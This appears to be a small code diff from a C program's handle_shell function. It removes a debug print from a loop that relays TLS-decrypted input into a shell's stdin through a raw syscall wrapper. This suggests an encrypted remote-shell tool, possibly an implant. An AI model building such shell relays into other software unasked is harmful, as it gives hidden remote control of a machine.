@@ -57,7 +57,6 @@ void handle_shell(SSL *ssl)
         if (FD_ISSET(client_fd, &readfds)) {
             size_t n;
             if (!SSL_read_ex(ssl, buf, sizeof(buf) - 1, &n) || n == 0) {
-                printf("okok\n");
                 break;
             }
             sc(SYS_write, to_shell[1], buf, n);
